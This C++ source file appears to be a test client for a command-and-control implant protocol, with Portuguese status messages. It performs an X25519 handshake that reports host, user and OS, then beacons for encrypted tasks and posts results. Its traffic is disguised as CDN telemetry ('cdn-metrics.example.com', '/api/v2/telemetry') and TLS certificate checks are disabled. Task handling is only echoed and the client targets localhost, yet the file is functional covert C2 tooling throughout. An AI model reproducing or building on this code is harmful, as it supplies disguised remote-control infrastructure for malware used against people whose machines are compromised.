#include "shared/crypto.h"
#include "shared/proto.h"

#include <openssl/ssl.h>

#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <unistd.h>

#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <fstream>
#include <string>
#include <vector>

namespace {

const char *kHost = "cdn-metrics.example.com";
const char *kPath = "/api/v2/telemetry";

struct Wire {
  int status = 0;
  std::vector<uint8_t> body;
};

std::vector<uint8_t>
PostTls(int port, const std::vector<uint8_t> &body,
        const std::vector<std::pair<std::string, std::string>> &hdrs,
        int &status) {
  int fd = socket(AF_INET, SOCK_STREAM, 0);
  sockaddr_in a{};
  a.sin_family = AF_INET;
  a.sin_port = htons(uint16_t(port));
  inet_pton(AF_INET, "127.0.0.1", &a.sin_addr);
  if (connect(fd, (sockaddr *)&a, sizeof(a)) != 0) {
    perror("connect");
    status = -1;
    return {};
  }

  SSL_CTX *ctx = SSL_CTX_new(TLS_client_method());
  SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, nullptr);
  SSL *ssl = SSL_new(ctx);
  SSL_set_fd(ssl, fd);
  SSL_set_tlsext_host_name(ssl, kHost);
  if (SSL_connect(ssl) <= 0) {
    SSL_free(ssl);
    SSL_CTX_free(ctx);
    close(fd);
    status = -2;
    return {};
  }

  std::string req =
      std::string("POST ") + kPath + " HTTP/1.1\r\nHost: " + kHost +
      "\r\nConnection: close\r\nContent-Type: application/octet-stream\r\n";
  for (auto &[k, v] : hdrs)
    req += k + ": " + v + "\r\n";
  req += "Content-Length: " + std::to_string(body.size()) + "\r\n\r\n";
  req.append(reinterpret_cast<const char *>(body.data()), body.size());
  SSL_write(ssl, req.data(), int(req.size()));

  std::string raw;
  char buf[8192];
  int n;
  while ((n = SSL_read(ssl, buf, sizeof(buf))) > 0)
    raw.append(buf, n);
  SSL_shutdown(ssl);
  SSL_free(ssl);
  SSL_CTX_free(ctx);
  close(fd);

  size_t h = raw.find("\r\n\r\n");
  if (h == std::string::npos) {
    status = -3;
    return {};
  }
  std::string head = raw.substr(0, h);
  size_t sp = head.find(' ');
  status = sp == std::string::npos ? -3 : std::atoi(head.c_str() + sp + 1);
  std::string b = raw.substr(h + 4);
  return std::vector<uint8_t>(b.begin(), b.end());
}

bool SaveState(const char *path, const std::vector<uint8_t> &priv,
               const std::vector<uint8_t> &key, const std::string &sid) {
  std::ofstream f(path, std::ios::binary | std::ios::trunc);
  if (!f)
    return false;
  uint32_t n = uint32_t(priv.size());
  f.write(reinterpret_cast<const char *>(&n), 4);
  f.write(reinterpret_cast<const char *>(priv.data()), priv.size());
  n = uint32_t(key.size());
  f.write(reinterpret_cast<const char *>(&n), 4);
  f.write(reinterpret_cast<const char *>(key.data()), key.size());
  n = uint32_t(sid.size());
  f.write(reinterpret_cast<const char *>(&n), 4);
  f.write(sid.data(), sid.size());
  return f.good();
}

bool LoadState(const char *path, std::vector<uint8_t> &priv,
               std::vector<uint8_t> &key, std::string &sid) {
  std::ifstream f(path, std::ios::binary);
  if (!f)
    return false;
  uint32_t n = 0;
  f.read(reinterpret_cast<char *>(&n), 4);
  priv.resize(n);
  f.read(reinterpret_cast<char *>(priv.data()), n);
  f.read(reinterpret_cast<char *>(&n), 4);
  key.resize(n);
  f.read(reinterpret_cast<char *>(key.data()), n);
  f.read(reinterpret_cast<char *>(&n), 4);
  sid.resize(n);
  f.read(sid.data(), n);
  return f.good();
}

int DoHello(int port, const char *state_path) {
  auto kp = crypto::GenerateX25519();
  int st = 0;
  auto env =
      PostTls(port, kp.pub,
              {{"X-Host", "testvm"}, {"X-User", "dj"}, {"X-Os", "linux"}}, st);
  std::printf("[hello] status=%d envelope=%zu\n", st, env.size());
  if (st != 200)
    return 2;

  const char *pub_hex = std::getenv("C2_SERVER_PUB");
  if (!pub_hex) {
    std::printf("[!] C2_SERVER_PUB ausente\n");
    return 3;
  }
  auto server_pub = crypto::FromHex(pub_hex);
  if (server_pub.size() != 32) {
    std::printf("[!] C2_SERVER_PUB invalido\n");
    return 3;
  }

  auto key = crypto::DeriveSessionKey(kp.priv, server_pub, "c2-session-v2");
  std::vector<uint8_t> plain;
  if (!crypto::Open(key, env, plain)) {
    std::printf("[!] Open do Hello falhou\n");
    return 4;
  }
  if (plain.size() < 64) {
    std::printf("[!] Hello curto: %zu\n", plain.size());
    return 4;
  }
  std::string sid(plain.begin() + 32, plain.begin() + 64);
  std::printf("[hello] ok pub_match=%d SID=%s\n",
              std::memcmp(plain.data(), server_pub.data(), 32) == 0,
              sid.c_str());
  SaveState(state_path, kp.priv, key, sid);
  return 0;
}

int DoBeacon(int port, const char *state_path, const char *send_op) {
  std::vector<uint8_t> priv, key;
  std::string sid;
  if (!LoadState(state_path, priv, key, sid)) {
    std::printf("[!] sem estado\n");
    return 3;
  }

  proto::Message m;
  m.header.session_id = sid;
  if (send_op) {
    m.header.op = uint8_t(proto::Op::Result);
    m.header.task_id = uint32_t(std::atoi(send_op));
    std::string txt = "hello from result\n";
    m.payload.assign(txt.begin(), txt.end());
  } else {
    m.header.op = uint8_t(proto::Op::Beacon);
  }

  auto wire = proto::Encode(m);
  auto env = crypto::Seal(key, wire);
  int st = 0;
  auto resp = PostTls(
      port, env,
      {{"X-Session-Id", sid}, {"X-Op", std::to_string(int(m.header.op))}}, st);
  std::printf("[beacon] status=%d envelope=%zu\n", st, resp.size());
  if (st != 200)
    return 4;

  std::vector<uint8_t> plain;
  if (!crypto::Open(key, resp, plain)) {
    std::printf("[!] Open do beacon falhou\n");
    return 5;
  }
  proto::Message in;
  if (!proto::Decode(plain.data(), plain.size(), in)) {
    std::printf("[!] Decode falhou\n");
    return 5;
  }
  std::printf("[beacon] op=0x%02x task_id=%u payload=%zu\n", in.header.op,
              in.header.task_id, in.payload.size());

  if (in.header.op != uint8_t(proto::Op::NoTask)) {
    std::string p(in.payload.begin(), in.payload.end());
    std::printf("[task] payload='%s'\n", p.c_str());
    proto::Message r;
    r.header.session_id = sid;
    r.header.op = uint8_t(proto::Op::Result);
    r.header.task_id = in.header.task_id;
    std::string out = "ran: " + p + "\n";
    r.payload.assign(out.begin(), out.end());
    auto renv = crypto::Seal(key, proto::Encode(r));
    int st2 = 0;
    auto rresp =
        PostTls(port, renv, {{"X-Session-Id", sid}, {"X-Op", "2"}}, st2);
    std::printf("[result] status=%d envelope=%zu\n", st2, rresp.size());

    // o Result volta com a proxima tarefa ou NoTask
    if (st2 == 200 && !rresp.empty()) {
      std::vector<uint8_t> p2;
      if (crypto::Open(key, rresp, p2)) {
        proto::Message in2;
        if (proto::Decode(p2.data(), p2.size(), in2))
          std::printf("[result-ack] op=0x%02x task_id=%u\n", in2.header.op,
                      in2.header.task_id);
      }
    }
  }
  return 0;
}

}

int main(int argc, char **argv) {
  if (argc < 4) {
    std::printf(
        "uso: %s <hello|beacon> <porta> <state.bin> [task_id_para_result]\n",
        argv[0]);
    return 1;
  }
  int port = std::atoi(argv[2]);
  if (std::strcmp(argv[1], "hello") == 0)
    return DoHello(port, argv[3]);
  return DoBeacon(port, argv[3], argc > 4 ? argv[4] : nullptr);
}
